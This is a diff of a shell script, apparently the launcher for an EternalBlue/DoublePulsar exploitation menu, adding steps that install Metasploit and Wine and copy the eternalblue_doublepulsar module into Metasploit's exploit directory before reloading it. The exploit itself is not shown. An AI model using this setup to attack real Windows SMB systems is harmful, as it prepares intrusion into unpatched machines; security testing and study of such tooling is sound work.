@@ -1,3 +1,6 @@
+if [ -e /usr/share/metasploit-framework/modules/exploits/windows/smb/eternalblue_doublepulsar.rb ] && [ -d /usr/share/metasploit-framework/modules/exploits/windows/smb/deps/ ]
+then
+if  [ "$(dpkg --print-architecture)" = "amd64" ]; then
 cat << "EOF"
 
            #######################################################
@@ -215,4 +218,23 @@ read -p '    Please select exploit: ' exploit
         echo '   Invalid option...'
 	./eternal_xploit.sh
      fi
+else
+echo 'Checking requirements . . .'
+dpkg --add-architecture i386 && apt-get update && apt-get install wine32
+apt-get install metasploit-framework
+clear
+clear
+fi
+else
+cp -r deps/ /usr/share/metasploit-framework/modules/exploits/windows/smb/
+cp -r eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/
+touch config.rc
+echo reload_all >> config.rc
+echo 'exit' >> config.rc
+/etc/init.d/postgresql start
+msfconsole -q -r config.rc
+/etc/init.d/postgresql stop
+rm config.rc
+./eternal_xploit.sh
+fi
 
